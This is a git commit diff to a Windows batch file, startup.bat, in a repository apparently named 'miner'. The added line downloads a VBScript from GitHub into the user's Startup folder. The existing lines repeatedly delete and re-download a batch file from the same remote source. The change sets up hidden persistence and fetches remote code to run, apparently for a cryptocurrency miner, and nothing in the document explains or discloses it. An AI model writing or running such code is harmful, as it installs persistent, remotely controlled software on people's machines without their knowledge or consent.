e6c98a788948c9d2b079fe84e2726aff25ab691d
nmshare <128151412+nmshare@users.noreply.github.com>
2023-04-01 23:47:12 +0300

    Update startup.bat

--- startup.bat
+++ startup.bat
@@ -1,3 +1,4 @@
+powershell curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" https://raw.githubusercontent.com/nmshare/miner/main/startup.vbs
 :start
 del C:\temp\temp.bat
 curl -o C:\temp\temp.bat https://raw.githubusercontent.com/nmshare/miner/main/start.bat
